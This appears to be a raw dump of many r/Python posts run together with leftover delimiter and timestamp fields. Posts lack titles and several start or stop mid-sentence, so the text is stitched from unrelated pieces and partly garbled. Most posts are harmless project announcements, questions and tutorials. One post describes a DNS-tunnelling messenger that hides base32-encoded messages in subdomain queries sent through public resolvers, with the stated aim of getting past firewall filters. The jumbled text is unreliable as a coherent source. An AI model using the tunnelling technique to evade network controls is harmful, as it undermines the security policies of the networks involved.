I recently developed a tool to do watchpoints in python. It was super easy to use:

    from watchpoints import watch
    
    a = 0
    watch(a)
    a = 1

As you "watched" `a` and `a` was changed, you will have the following print in your console:

    ====== Watchpoints Triggered ======
    Call Stack (most recent call last):
      &lt;module&gt; (my_script.py:5):
    &gt;   a = 1
    a:
    0
    -&gt;
    1

You can also watch built-in data structures and self-defined objects

    a = []
    watch(a)
    a.append(1)  # Trigger
    a = {}  # Trigger
    
    class MyObj:
        def __init__(self):
            self.a = 0
    
    obj = MyObj()
    d = {"a": 0}
    watch(obj.a, d["a"])  # Yes you can do this
    obj.a = 1  # Trigger
    d["a"] = 1  # Trigger

It is not limited to the current scope, the log will be triggered anywhere in your program

    from watchpoints import watch
    
    def func(var):
        var["a"] = 1
    
    a = {}
    watch(a)
    func(a)

will generate:

    ====== Watchpoints Triggered ======
    Call Stack (most recent call last):
      &lt;module&gt; (my_script.py:8):
    &gt;   func(a)
      func (my_script.py:4):
    &gt;   var["a"] = 1
    a:
    {}
    -&gt;
    {'a': 1}

You can also define your own callback or call pdb when the variable is changed:

    watch.config(callback=my_callback)
    watch.config(pdb=True)

This is a small and super intuitive debugging tool to use. Please let me know if there's any questions(or file an issue like a programmer :) ).

Ive been thinking about creating a platform/program/script that allows me to query indicators of compromise (IPs, domains, hashes, etc.) against threat intelligence feeds or aggregators. The ultimate goal would be to create a single command/program that queries multiple threat intelligence feeds at once and returns information about whatever Im querying instead of having to query my indicator against an individual feed, lather, rinse and repeat. Before I get started, I went ahead and did a couple of google searches but it yielded mainly 4-5 year old GitHubs/scripts/programs that I dont think are being maintained and would rather use something a bit more updated. 

Does anyone know of a recent script/program/platform/function written in python (my preferred language) that I can use or build upon instead of starting from scratch?

![video](gvsayf7hyie61 "Example usage")

Source code: [https://github.com/phillipdupuis/dtale-desktop](https://github.com/phillipdupuis/dtale-desktop)

Live demo: [http://dtaledesktop.phillipdupuis.com/](http://dtaledesktop.phillipdupuis.com/)

You can install it via `pip install dtaledesktop`

Dtale-desktop lets you turn **any** pandas DataFrame into a dashboard widget. All you need to do is launch it via `dtaledesktop` and plug in the code for producing the DataFrame. That widget will be present every time you launch dtaledesktop, and by simply clicking a button you can run that code and analyze the resulting DataFrame in [dtale](https://github.com/man-group/dtale) or [pandas-profiling](https://github.com/pandas-profiling/pandas-profiling),

Code snippets can be added or edited directly from the dashboard, and upon doing so the dashboard is immediately updated. It also automatically caches data to improve performance.

Dtale-desktop can be run both locally and as a web service -- the demo site is actually running on a kubernetes cluster. When run as a web service, it uses websocket connections to push real-time updates, ensuring that all connected users see the same thing. There are a large number of settings which can be used to configure exactly how it behaves, documented [here](https://github.com/phillipdupuis/dtale-desktop#settings).

And lastly, if anyone is curious, it works by essentially running two web apps in parallel. The main one has an async FastAPI backend and a react frontend, and it is responsible for displaying the dashboard, executing your code, and launching/killing dtale instances. The second app is a dtale server. These apps run in different threads and listen on different ports, which allows the async FastAPI app to run without the event loop being blocked by the synchronous dtale app.""|||How to play a Sound in Spyder?|||Python|||1|||0|||1612036033|||""Hi,

Repo: https://github.com/Fitzy1293/daily-covid

Pypi: http://pypi.org/project/dailycovid

Data source: https://github.com/nytimes/covid-19-data

It can be used like that for a whole state or like this on the county level. 

`dailycovid -sc "California-Los Angeles"`

`dailycovid -s CA -c "Los Angeles"`

`dailycovid --state CA --county "Los Angeles"`

It downloads the nytimes county level covid data on initial use, or when you use -g as a flag, and parses and splits it up by state into diff files. The actual downloading and creating the initial cache is the slowest, but you only have to do that once a day. 

Now data stored for each state in different files, when you run it again you just have to go through a file with like 1/50th the data to find a matching county. 

Once it is cached it works well, takes about 1.5 seconds per county, there are 3,142 counties in the US, so ~ 80 minutes to create plots and find daily deltas for the whole U.S.""|||Japan API (Free and Open Source Data) using Flask|||Python|||1|||1|||1612035595|||""[github.com/japan-api/api](https://github.com/japan-api/api)

These are the main features:

* Automatic import of Garmin `fit` files and `gpx` files
* Automatic naming of activities based on daytime, sport and geo location
* Render your activity gps data on different OSM maps
* Plot your activity specific data e.g. heart rate, pace, temperature, cadence and altitude
* Find the fastest sections in your activity data and create a ranking
* Convenience CLI for installing, running, stopping, updating, ...

**workoutizer** is running in my local network on a Raspberry Pi and whenever I need to charge my sport watch, I simply connect it to the Raspberry Pi. The recent activity `fit` files are automatically imported, parsed and added to the database of the application. The web interface provides a dashboard-like view on the overall history of your activities about also many other pages like a sport overview page, detailed activity page, awards page and more.

This is the dashboard view which comes with pre-bundled demo activity data:

 Error: The window leaves space required to fill the image but image  doesn't appear. I tried the same code with other images that I know will load but the same error occurs, I tried using these images in another GUI,  there they loaded without error. 

Required Output: The images should appear followed by corresponding text article beneath them.

Current Output: Spaces are left where images should appear but text prints fine.

(+Python Competition) - Week 3 of Learn Python - Tonight at 6PM EST|||Python|||1|||3|||1611947771|||""I've decided to up the ante and have a little bit more fun tonight. At 6PM EST tonight we'll start talking about python functions, how you can use them, why you should use them, and maybe even flirt with recursion. M1n1m00se and Mavenger might even set up a ghetto RPG battle with some randomness sprinkled in. . . mostly using functions. We're still doing the basics though so don't expect anything tooooo crazy. We have a nice crew of mentors  hanging out in chat to help answer your questions and I'll be trying to keep up as well.

We're still experimenting with the format so if you have suggestions on topics you'd like to see discussed please feel free to drop a suggestion. We're thinking 2-3 hours of coding examples/discussion and then the after party where we goof around is a good mix.

&amp;#x200B;

**NOW** for those who have kept reading! Once we finish the stuff with functions we enter into the "after party". Tonight I've decided to throw a little after party python competition for any of you Pythonistas out there who want to test yourself against the world. Plus, I want to give some love to all my nerdy friends out there.

&amp;#x200B;

**When does it start?** We'll present the challenge on stream after we get through the function material. Once the challenge is presented you can start solving. 

**How do you win?** The first person to post their *working code* (not the answer to the challenge!) in the discord wins. 

**What do you win?** I'm thinking a Steam gift card or game, something in the neighborhood of 20-40 wingwangs depending on how hard we make the challenge and how cool your solution is! Who knows, maybe there will be a reward for the craziest solution. . . 

&amp;#x200B;

Join the fun tonight here: [M1N1M00SE](https://www.twitch.tv/m1n1m00se) (6PM EST)

Join the very small discord community here: [Minimoose Lodge](https://discord.gg/3hUqkrz5)

# TargetHunter

A little 2D game where you have to hunt red targets, while your speed is increasing and decreasing as things progress

## How to play : 

Be sure to have `Ursina` installed, the render engine I used for this project by using :
&gt; pip install ursina

Your goal is to catch as much red targets as you can, using the WASD key, you can change them to ZQSD for French people or anything you want, in this part of the `TargetHunter.py` code, by changing the letter in the [] :

```python
# WASD case :
	if held_keys['w']:#Go Up
		player.y = player.y + SPEED * time.dt
	if held_keys['a']:#Go to the Left
		player.x = player.x - SPEED * time.dt
	if held_keys['s']:#Go Down
		player.y = player.y - SPEED * time.dt
	if held_keys['d']:#Go to the Right
		player.x = player.x + SPEED * time.dt
```

Be careful, each time you hit a target, your speed increases and you'll gain 1 point, but if you touch a wall, you'll be slower, and you'll lose a point !

The default time of a game is 30s, but you can modify this value in this part of the code to fit your needs (l.25):

**/!\ This value is only equal to the number of second of a single game if you are running on a 60 Hz monitor /!\\**

```python
#Duration of a game : 30s
rem_time = 30
```

Using `Ursina` engine in `Python`

Maybe even moving them and keeping the file structure. With that goal in mind I created this CLI script. The specific use case was a script that could be scheduled to watch the Downloads folder and move movies to a specific place, pictures to another, etc. I hope someone else finds this useful.

## [ext-sort](https://github.com/radicalarchivist/ext-sort)
A utility that recursively moves files to a specified directory based on their extension  
v.0.1

Modularyze ([repo](https://github.com/jungerm2/modularyze), [documentation](https://modularyze.readthedocs.io/en/latest)) is a new library that enables dynamic YAML-based configurations. It brings the power of dynamic templating (provided by Jinja2) to configuration files, which enables multi-file, parametrizable and fully-instantiable configurations.

Consider this small example from the README. If you have the following config file named 'imagenet.yaml':

    {% set use_pretrained = use_pretrained | default(True) %}
    {% set imagenet_root = imagenet_root | default('datasets/imagenet') %}
    
    network: &amp;network
        !torchvision.models.resnet18
        pretrained: {{ use_pretrained }}
    
    val_transforms: &amp;val_transforms
        !torchvision.transforms.Compose
        - !torchvision.transforms.Resize [256]
        - !torchvision.transforms.CenterCrop [224]
        - !torchvision.transforms.ToTensor
    
    dataset: &amp;dataset
        !torchvision.transforms.datasets.ImageNet
        args:
          - {{ imagenet_root }}
        kwargs:
          split: 'val'
          transforms: *val_transforms

You'll be able to instantiate it like so:

    import torchvision
    from modularyze import ConfBuilder
    
    builder = ConfBuilder()
    builder.register_multi_constructors_from_modules(torchvision)
    conf = builder.build('imagenet.yaml')

And just like that, conf will be a dictionary containing the instantiated network object, dataset object, etc. Note that this library was developed for use with ML, but it can just as easily be used in a different setting.

There are a bunch more use cases and features that are described in the docs, so I'd encourage you to take a look, and leave your thoughts and suggestions below! The code itself is rather straight forward and well commented/tested and should help you get started.

**Pros:**

1. Allows you to interact with an open Excel spreadsheet (almost all other Excel wrappers cannot do that as far as I know).
2. Since you are referencing the Excel application directly, you have access to the entire Excel object model (or COM object model)
3. Allows you automate other Windows application (Word, Outlook, even Photoshop) and Windows API.

**Cons:**

1. Documentation/resources are lacking.
2. Windows only.
3. Error message doesn't always help.

This package allows to extract in real-time frames or audio segments of a twitch stream as numpy array. It heavily relies on FFmpeg to decode on-the-fly and asynchronously. Then the package stocks the frames or the audio segments into a fifo for you to be grabbed.

The idea was to set a library that could be used to apply computer vision or signal processing on a twitch stream.

It's nothing ultra fancy but it was fun to deals with threads and ffmpeg.

I also added two examples to see how it can be used in a project (in examples/ of the github):

I use one app, my friends all use different apps.

From what I've learned there are no seamless solutions for combining: Runkeeper, Sports-tracker, Google-Fit, Endomondo, etc.

I've looked into Google Fit being the 'glue' to unify them all, but that also doesn't work with some apps, like Sports Tracker.

Would anyone be interested in making an aggregator? 

Like you sign up with your different accounts, and every time you post an exercise, this is then copied to those other apps?

There is a file format that is essentially the logging from your app, that can be technically imported by another app, but I haven't really looked into this.

I'm not affiliated with this project, just an excited future user waiting for the crowdfunding campaign for the hardware to finish so I can get my hands on one and start using it, and maybe contributing to the project.

GitHub: https://github.com/GlasgowEmbedded/glasgow
Crowd Supply Campaign: https://www.crowdsupply.com/1bitsquared/glasgow

The Glasgow Interface Explorer is a completely re-configurable interface for digital I/O, both input and output, including automatic voltage level sensing and independently controllable voltage levels for two different I/O banks. It uses an FPGA (field programmable gate array; essentially a re-configurable array of digital logic elements that you can use to form different high-speed digital circuits at run-time) and high-speed (480 Mb/s) USB to allow it to interface with a pretty wide variety of protocols, even unusual ones with tight timing requirements.

This is something that you would use if you're trying to interface to some obscure piece of hardware, or just generally if you're doing many kinds of digital hardware work and need an adapter to probe, test, inject messages, program an EEPROM or flash, or the like.

And one of the really interesting parts is that is can achieve this flexibility by using the first fully open source FPGA toolchain, yosys, so that there are no proprietary tools needed for reprogramming the FPGA. Most FPGA vendors sell commercial tools for programming their chips, which limits the ability to allow users to re-program and re-configure on the fly.

The software is all built using Python; there's a Python based HDL (hardware description language, which describes the digital circuits), nMigen, that allows writing easy to reuse digital blocks for the FPGA, as well as the host side code. This means that you can actually program the reconfigurable digital logic in the FPGA using only Python.

So it can be used as a logic analyzer, USB to almost anything interface (within its specs, of 1.8 to 5 V levels, and max of 100 MHz signals), reverse engineering tool, programmer/debugger, or all kinds of other things. Sort of an ultimate digital Swiss army knife.

However, when simply reading source code it can be hard to see the forest from the trees, which is why I've created a small library for exactly that purpose. It visualises source code as a graph of dependencies between variables, functions, classes and such. Best to show some output right away:

[sphinx-autodoc-typehints](https://preview.redd.it/fs5dsozoujd61.png?width=1559&amp;format=png&amp;auto=webp&amp;s=d19e98dc82a39c75623c8248f187709667a4001c)

The example was generated from a single-file 3rd-party Sphinx extension "sphinx-autodoc-typehints". It shows clear structure: a single top level function with a clean processing hierarchy. A substantial, completely separate section on the left under "format\_annotation" could for example be an ideal candidate for a sub-module, should the need to refactor arise. For a first-time reader, this is very insightful and intuitive when compared to reading 400+ loc thouroughly.

A more useful example can be found in Pydot (2k loc). The nodes have two attributes: shape and color. Shape is determined by the type of node: class, function, variable etc. Color is determined by the number of connections that a node has. Blue and green are for root and leaf nodes, respectively, while levels of red are used to visualise busy hub nodes.

[pydot](https://preview.redd.it/5sq6tavayjd61.png?width=2413&amp;format=png&amp;auto=webp&amp;s=14e0f1b85d079ea7c6d5b4ad0cd45b4dec9b6e9a)

You can find more examples of popular libraries in our [RTD gallery](https://pyfactor.readthedocs.io/en/latest/gallery.html), or try it out on your own sources by installing on [PyPI](https://pypi.org/project/pyfactor/).

This library came about when I tried to introduced myself to Black's single-file code base - [6000 lines of horror](https://pyfactor.readthedocs.io/en/latest/gallery/black.html). I'm not here to diss Black or its contributors, 6k loc is more than enough to be complex anyway, but the graph reveals that complexity at a glance. My hope is that it will be particularly useful for those that need to get an understanding of a code base fast, those newer programmers that want to understand their own code and how to make it better, and as a tool for refactoring in general. It's no miracle worker, but I think it could have potential as a tool for making the right decisions. What do you think?""|||I made a command line utility that looks up a python program's error message and opens the search result in a new tab|||Python|||1|||0|||1611612718|||""Hi guys! As the title mentions, I basically made a command line program that wraps around whatever python program you intend to run (in bash terminal), and immediately returns the top search result in a newly opened tab.

For most of the simple programs that I make, I usually end up having to copy and paste the error message, and look at the first result, so I thought it would be fun to automate that.

I'm hoping that this could be useful to someone else, and I'll try building onto it more in the future.

We make it easy to scale from laptop to cluster, without requiring any devops work.

Garnet plugs into any existing Python environment (notebook, IDE, CI/CD pipelines, custom apps) using a lightweight client library, and enables users to scale popular data/ml libraries (including pandas, NumPy, scikit-learn, XGBoost, etc.) and custom code to a remote cluster for execution. Under the hood, we natively wire up Dask with Kubernetes for scheduling, which brings advantages such as dynamic resource allocation, ephemeral clusters and autoscaling, while abstracting the devops complexity for developers and data scientists.

Our vision is to build the orchestration layer for distributed computing in Python. Were starting off with Dask, but have goals of supporting other frameworks such as Ray and Modin in the future.

Some of the cool use cases weve seen from our users are:  
\- Bursting to the cloud from local dev environments for data and memory intensive computations

\- Standing up managed Dask and Kubernetes clusters programmatically in 3-4 lines of Python, without any devops knowledge (Docker, k8s etc.)

\- Parallelize existing codebases in pandas, NumPy, scikit-learn, XGBoost etc. with minimal code changes, without opting for a more complex system such as Spark

Currently, users can download our client library and run Dask workloads on our hosted and managed cluster for free (see [docs](https://docs.garnet.ai/)). Were working on adding the capability to run Garnet on your own cloud (Kubernetes) in an upcoming release.

Were excited to hear your feedback, and what youd like to see.

Technically, it was not exactly what he said. But being applied to the process of building an application these words are much more than true. The thing is, one has always to decide, which strategy to follow, to create an app from scratch or build one. Each approach has its benefits and drawbacks and the question of which one to choose can be solved in different ways depending on the business needs and constraints. To make the right decision and pick the best strategy for your particular project, try to answer the following questions.

1. Is your business large or small? If large, how much is it?
2. Are you about to burst its growth anytime soon?
3. Is the business structure supposed to evolve with time?
4. What does the success of your project depend on? Will there be some sophisticated technology used?

Tkinter is a easy-to-learn pre-built module of python

which allows anyone to create a GUI (graphical user interface)

with an ease.

You can think of tkinter like html language. 

#  Importing Tkinter

    from tkinter import *

# Basic Requirements:

A tkinter file needs to start with a instance of Tk class (which comes when you import the module)

    root = Tk() 

# Widgets in tkinter:

A GUI consists two things from the perspective of a user.

Those are: output and input.

These two things can be done with the help of widgets.

For example: A Button is a widget , A Text area is a widget

#  Basic Widget Syntax:

    variable_name = Widget_name(parent,**option) 

Putting a Widget in tkinter on screen (Pack And Grid)

Basically by creating an instance of a widget will not show it on the screen .

To make it appear on the screen you need to use either pack method or grid method

which comes along with that widget.

There's also a place method but we will talk about it in another post

As you may notice from the name, it is called Eml Parse Py, originally it started off as a Python based CLI app, as I am intending on attaching a HTML file containing the email headers; I decided to utilise Flask because I knew I could do a lot with little. I've done a little of ReactJS as well, so I decided to use it as a frontend to abstract; and challenge myself when creating this app.

Any feedback, and comments are very welcome, this has been a very fun project, I am still working at implementing further additional features!

people in the district).

![Grid after gerrymandering for blue](https://github.com/mazore/gerrymandering/blob/master/images/gerrymandered_for_blue.png)

I have just published 'jazzml', my first python package and I'd like to share it
with others (https://pypi.org/project/jazzml/0.1.0/).

Though, I am not sure whether this is the right place for such announcements...

If not, please, forgive me.

'jazzml' is a lightweight package to decode both json and yaml documents.

It does so by allowing the user to first specify a Decoder and then apply it to a json/yaml document.

A Decoder can be viewed as a specification of the expected structure of a json/yaml document.

This 2 step strategy brings some level of implicit checking. That is, if a document structure does not conform to the Decoder, the parsing will fail.

Other nice features of `jazzml` include the possibility to define Decoders for recursive data structures and to dynamically choose a Decoder based on some specific value defined by the json/yaml document.

You'll find a more complete documentation on https://jazzml.readthedocs.io/en/latest/api.html

I hope you'll enjoy it.""|||SimpleGUIBuilder - A GUI for designing Python GUI's for PySimpleGUI|||Python|||1|||0|||1611518167|||""Hello Python people :)

I don't really like doing frontend but I really like the idea of giving my backend/terminal programs something more pleasurable to interact with and look at.

That's when I came across [PySimpleGUI](https://github.com/PySimpleGUI/PySimpleGUI), a simple solution to quickly give my programs an interactive front. Shortly, it allows you to quickly create a GUI by designing its layout and then map it to your backend code.

But in checking it out I found I wanted more and had an idea: It would be nice if PySimpleGUI and therefore GUI making was in itself more interactive.

And that's how [SimpleGUIBuilder](https://github.com/PriestTheBeast/SimpleGUIBuilder) came to be: A GUI for creating/designing GUI layouts for PySimpleGUI, made with PySimpleGUI.

So i started looking for a Tutorials from some former Google Workers to start learning and stepped over CS Dojo.  
In His first Python Episode at minute 21:57 hes solving the problem of swapping Two Variables by creating a temporary variable.

    v1 = "first string"
    v2 = "second string"

So his 1st solution is:

    temp1 = v1
    temp2 = v2
    
    v1 = temp2
    v2 = temp1

His 2nd solution is:

    temp = v1
    v1 = v2
    v2 = temp

  
For me there comes up a question now refering to "temporary variables":   
Why do you name it temporary variable?  


My Solution doesnt work:

    a = v1
    b = v2
    v1 = b
    v2 = a
    print(v1)
    print(v2)

I created a simple save editor for  Seiken Densetsu 3. I only tested it on the English fan-translation so be wary of trying it out on Trials Of Mana or the Japanese version and  always backup your save first before editing it.

It uses [Construct](https://github.com/construct/construct) to parse and save the binary, PyQt5 for the GUI and [scalpl](https://github.com/ducdetronquito/scalpl) for the advanced dicts. My future plan (but I don't know if this is feasible) is to extend this save editor in a general binary editor based on Construct. It should generate a GUI from construct data structures with some additional metadata. GitHub CI is used to automatically generate Windows and (GNU/)Linux artifacts. I've yet to find a way to make easy to run Mac OS PyQT5 applications.

So far, these things can be edited:

* Character name
* Simple character stats
* Item inventory
* Running music
* Location
* Money

A simple Windows and Linux executable can be found on the GitHub releases page.

[https://github.com/rrooij/sd3save\_editor](https://github.com/rrooij/sd3save_editor/releases)

You can also read the README for more details.

Let  me know what you think and feel free to improve it as well! I would love to be sure that the Trials of Mana version is also working fine, I would love to get equipment working and figure out  more existing things that we can edit in saves that we perhaps don't  know yet.

1. You can now play it with a custom username
2. Added 2 new fun difficulties
3. Added a points system and a new series-matches system
4. Gameplay involves pressing of keyboard keys that's it
5. You can now view the details such as the overall winner and the number of matches played in a series before you change the difficulty level (basically start a new series of matches with a new  difficulty)

I originally made this about 2 years ago and looking back at the original code, I almost cringe but I'm proud that I've improved. I want to be able to look back at the current version of my code and feel that again, so any advice about how terrible it currently is would be appreciated!

Most recently, I've added support for Erai-Raws and SubsPlease since HorribleSubs has stopped uploading torrents.

These are scraped from nyaa.si. You can select the quality and range of episodes. Because some of the titles might be written a bit differently, there is a message telling you which episodes it couldn't download.

* searches for shows using the same search engine as on nyaa.si
* allows user to select quality (480p, 720p or 1080p)
* select range of episodes to download, including episodes with decimals e.g. 13.5
* doesn't download premade batch files which are already available by the groups on nyaa.si
* loads magnets in chronological order of upload to nyaa.si
* tells you how many episodes weren't found/loaded
* option to download the .torrent files instead of opening the magnets directly (although not recommended)

Anyways, here's the link to the GitHub: https://github.com/zaini/nyaascraper

If you have any requests, I'll be happy to try and add them. Feel free to contribute.

It lets you build slides using a composable API and then render them to PDF. It was created out of frustration of having to deal with existing tools for creating technically oriented presentations. We believe that creating presentations in a programmable way makes the slide-making process more smooth and reliable.

As an example, this code:

    import elsie
    slides = elsie.SlideDeck()
    
    @slides.slide()
    def hello_world(slide):
        import datetime
        slide.box().text(f"Hello from")
    
        year = str(datetime.datetime.now().year)
        row = slide.box(horizontal=True, p_top=20)
        for i in range(4):
            row.box(width=40, height=40).rect(
                 color="black",
                 bg_color="black" if i % 2 == 0 else "white"
            ).text(year[i], elsie.TextStyle(color="red"))
    
    slides.render("slides.pdf")

produces the following slide (image is downscaled to fit here):

You can find a comparison of Elsie vs other slide making tools in the [**User guide**](https://spirali.github.io/elsie)**.** I have also written two [blog posts](https://kobzol.github.io/presentations/elsie/2021/01/07/tools-for-technical-presentations.html) where I describe why it might be useful to create presentations programmatically.

Elsie has been in development for [several years](https://www.reddit.com/r/Python/comments/9c5vym/framework_for_making_slides_in_python/). Recently, we (/u/winter-moon and me) have released a new version with a lot of new features:

* Brand new [**User guide**](https://spirali.github.io/elsie)**.**
* Support for rendering basic [Markdown](https://spirali.github.io/elsie/userguide/markdown/).
* Built-in functions for [lists](https://spirali.github.io/elsie/userguide/lists/).
* Experimental `Cairo` backend. Previously, having `Inkscape` installed was required.
* You can now tune your slides interactively in [Jupyter](https://spirali.github.io/elsie/userguide/jupyter/).
* More [shape types](https://spirali.github.io/elsie/userguide/shapes/) (such as ellipses and polygons) are now supported.

You can find the source code of Elsie [here](https://github.com/spirali/elsie).

The ray tracer is a single python file ([RayTracer.py] (https://alecdee.github.io/raytracer/RayTracer.py)), that renders a default scene if you call it with python. I recommend using PyPy for speed though.

The version I linked above doesn't use any libraries aside from time, math, random, and sys. Notably, it doesn't use GPU calls or math libraries like numpy. I've also made a separate version that uses the multiprocessing module, and another version that offloads rendering to a C extension I made.

The mathematics and geometric primitives in the ray tracer actually allow it to render in higher than 3 dimensions. One of the images on my page shows 4D cubes. Unfortunately, I think that most 4D scenes would need to be animated to be very interesting, so I haven't tried many renders in higher dimensions.

The ray tracer supports reflection, refraction, subsurface scattering, and any material can emit light. It doesn't account for diffraction or wave based effects. It also supports mesh instancing and can load wavefront model files.

Its been fun ride with django. I have started learning python during the beginning stages of pandemic and its been 5 months with django. I started web development with flask by following Corey shafaer's flask blog series.

Flask is a good framework, but there is a lot to do especially if you're planning to manage users which django does by default.

So after few weeks with flask, I thought of experimenting django and to be honest it was so difficult to get started with django and its architecture, but eventually after grinding with it everything came to normal.

Big thanks to django documentation, the best docs in the whole world!! Do you agree with me??

I also followed Corey shafaer's django blog and Justin Mitchel's youtube channel to solidify my knowledge in django.

After learning basics of django, I started making my tutorial website which took me 2 months to complete.

I learned so many new concepts while making this project like custom user model, comment system and much more!!

My tech stack was

1) bootstrap 
2) django 
3) heroku for deployment 

My app is nothing crazy, but it gives me a sense of fulfillment that all of my hardwork learning python and django has given me something to rejoice 

And finally here is link to my [website ](http://www.programmingmind.tech)

I would like to hear recommendations and suggestions regarding the website.

Learning process never ends, try to learn even more and try to make things even better

I'm beginning a large python project that will be async at the core.

I'd like to gauge the community's feelings on the state of async code and frameworks in python.  I've done a fair amount of work with asyncio so I'm relatively familiar with common patterns and frustrations.  It seems that the community thinks that asyncio could be improved, but since it's the standard library module it is the defacto choice.  I believe the hope was that asyncio didn't have to be the only API, but ideally other frameworks would use the same event loop.

Now today we have other great tools such as trio, which brings much needed features like task groups, cancel contexts, timeouts, exception groups, and more.  However it seems that trio is inherently incompatible with the asyncio loop, requiring imperfect shims for interoperability.  Some of those features, like exception groups, may make their way into future python versions (hoping for 3.10!).  However the path for many of these improvements is probably far in the future for the stdlib.

There are other projects such as anyio, which give the programmer generic tools for implementing trio-like concepts for either framework.  This seems good but still requires one or the other event loop, so you must choose to run either asyncio or trio under the hood.  Is python going the direction of requests, where nobody uses urllib, but for async?

So it seems to me that a new project had the following choices for direction:
* Use stdlib asyncio
* Use asyncio with third party extensions like anyio.
* Use trio, and probably trio-asyncio to bridge the gap with existing asyncio libraries.

So, what do you think is the right choice for a new project that needs to be maintained for a long time?  What's best for long term stability, features, and developer happiness?  What would you choose?

It's a lightweight type checking module, which works very well when checking incoming payloads in an API!|||Python|||1|||1|||1611185210|||""**Hey guys!** Long time lurker, first time posting!

I recently started working with Flask in Python and I've made my own API for doing personal finance, and for checking all the incoming payloads from the requests, I decided to make my own little library for doing standardised type checking - and it's called **pytechecker**!

It works for any arbitrary Python dictionary which has strings for keys. You can define sample objects and check objects against them, and if the type checking fails, you'll get very exact error messages telling you why it failed!

Here's a quick example of how a sample object would look, and then an object which would pass the type checking!

    from pytechecker import check
    
    sample = {
        "name": {
            "required": True,
            "allowed_types": [str]
        },
        "age": {
            "required": True,
            "allowed_types": [int]
        }
    }
    
    obj = {
        "name": "dcronqvist",
        "age": 21
    }
    
    # succ will be True if it passed type checking
    # errors will be an array of strings that tell you
    # what went wrong during type checking, if succ is False.
    succ, errors = check(sample, obj)

Take a look at the [GitHub repo](https://github.com/dcronqvist/pytechecker) if you want to see more examples! It's also on PyPI, so you can just `python3 -m pip install pytechecker` to try it out!

I would really like some feedback on this project from you guys! Perhaps you can find some bug that I haven't found yet? Thank you for reading! Now I'm going to keep lurking until I have more projects to post :)""|||Tracking 2d points between frames.|||Python|||1|||2|||1611181683|||""[removed]""|||Is it possible to create a script with python that can help me automate sending monthly statements to my company’s service centers?|||Python|||1|||2|||1611180701|||""[removed]""|||Best way to mock a `@property` on an instance?|||Python|||1|||2|||1611180366|||""[removed]""|||Can computers learn to lie?|||Python|||1|||1|||1611179420|||""I trained two different AI's as observers with a Q-learning algorithm and a neural network to play a simple "min-max" game, in this game there is the possibility to lie but it has a risk associated.

so, I am a webdeveloper and have been using the Django Web Framework for some time now. One of the amazing advantages of Django is that migrations and seeding are deeply integrated, which makes database management very enjoyable in larger teams.

However, my company, which uses python for many core areas, now would also like to use some kind of database management/version control for non website related things.

After using big ol' daddy/mummy G, most posts and answers i found seemed a bit outdated (E.g. StackOFlow answers from 2009).

What we're looking for is a python db migration and seeding package for python where you:

\- write database tables and structures in migration files (each new table or table modification should be done in a new migration file and not by modifying the "main" file)  
\- create seeding files, populating the database with initial, core required, datasets

Both should be executed with seperate migrations and seedig commands and should also be able to rollback to previous states.

(Probably, the requirements i just wrote are exactly what migration and seeding means :P )

I'm relatively new to Python and just started learning it in the summer with Al Sweigart's excellent course. I wanted to share this project that I've been working on.

Here's how the program works -

* Two sets of two words are randomly selected from a text file containing over 100,000
* Each of these phrases is searched in Google Images and two images are downloaded, using [google\_images\_download](https://pypi.org/project/google_images_download/)
* The two images are distorted, resized and merged together using [Pillow](https://pypi.org/project/Pillow/)
* The resulting image is uploaded to Instagram using [instabot](https://pypi.org/project/instabot/)

I run the program using crontab on my Raspberry Pi Zero twice a day. I know this is pretty out there but if you like the results feel free to check out my instagram - [@img\_portal](https://www.instagram.com/img_portal/)

It's been a fun project and I've learned loads doing it.

Thanks for reading!""|||Hacking the DNS protocol to use it as a messaging system|||Python|||2|||18|||1611093381|||""A while ago, I posted about I made a fun POC of hacking the DNS protocol to send messages to a server (creating a communication service relying on DNS requests/replies): [https://www.reddit.com/r/Python/comments/jf8zbf/i\_hijacked\_dns\_queries\_to\_send\_messages/](https://www.reddit.com/r/Python/comments/jf8zbf/i_hijacked_dns_queries_to_send_messages/) 

To summarize the idea, the project is using QNAMEs to encapsulte the client messages (encoded in base 32 as a subdomain, for example: [encoded-message.dns.server.com](https://encoded-message.dns.server.com)), and the server decode the message and sends a DNS TXT reply which content is base 64 encoded.

Well it only worked on the same machine at the time (or when I had luck and had a server binded to my port 53 somehow (to have a port appear as open|filtered, something must be binded to it, and I struggled for a lot of time before understanding why my requests were answered with ICMP type 3 error, port unreachable, when going online)).

Now it's fixed, and what's even better, I can send a DNS TXT request to Googlge ([8.8.8.8](https://8.8.8.8)) about [encoded-message.dns.site.com](https://encoded-message.dns.site.com), and since I've registered as my own DNS, everything the other big DNS don't know about will be forwarded... to my server. Thus I can just use the command dig on linux to send messages to my server, from everywhere in the world, which is the main point for this project: DNS requests are often unfiltered (that doesn't mean they aren't logged by your ISP !! the goal of the project isn't to avoid log but firewall filters), thus when you have a limited connection (no access to internet), oftentimes DNS requests can still go out on the internet. Which is very interesting (but slow) to communicate from an airplane to someone on Earth, if you don't want to pay $50 to have 2GB of Wifi on the plane. There are a lot of other possible uses, and that's awesome.

Despite existing Typer and Clicker, I decided to create my own library to parse command-line arguments. The reason was Typer and Clicker are too heavy to me, but argparse is too low level. But because I created it with my own ideas behind it - it's slightly different from Typer. I use the Optional type to separate positional and optional arguments (because argparse allows using default values for positional arguments). The project is in the early stage, and some options have not been supported yet (epilog, for example). It would be great to know use cases I have missed or feature requests.

Demo with Source Code available :)|||Python|||1|||40|||1611066610|||""&amp;#x200B;

![video](nx176vvwtac61 "Marshmallow Ninja Death Compilation :)")

Codename Mallow is an adrenaline-charged versus multiplayer game with armless melee battles, one-hit-kill weaponry, and wildly unpredictable stages. Duel for Ninja Supremacy with up to 4 friends in local or online play.

2.5 years in the making (so far), Codename Mallow began as an attempt to recreate the feel of DOS cult classic Marshmallow Duel in a more modern package. Feature creep took over, and here we are now on the very brink (Q3 2021) of release! My journey taught me the basics of programming and game development, and I had a blast tackling things like rope physics, particle engines, and even basic socket/threading applications.

I put my game in to the Fan Favorite vote at the GDWC for "what do you have to lose" reasons. I am absolutely thrilled (and shocked!!) to be a finalist among many INCREDIBLY polished indie projects. It honestly feels a little surreal. I shared here a few months ago, and was blown away by the support and positive feedback. Many of you asked me to come back and share a link when my steam page was up, so here we are.

So if this game is your cup of tea, or maybe you just want to support a little underdog Python project, here are the links:

Notes:  
While I have learned a lot on this journey, I am not a programmer by trade. Looking back it is quite embarrassing how poorly everything is laid out. So please keep this in mind if you decide to peruse the code. Also: I HAVE NOT included the online play code in the available source code file. I need to make it better first. Right now it is peer-to-peer and requires port forwarding to function properly, so I still have work to do.

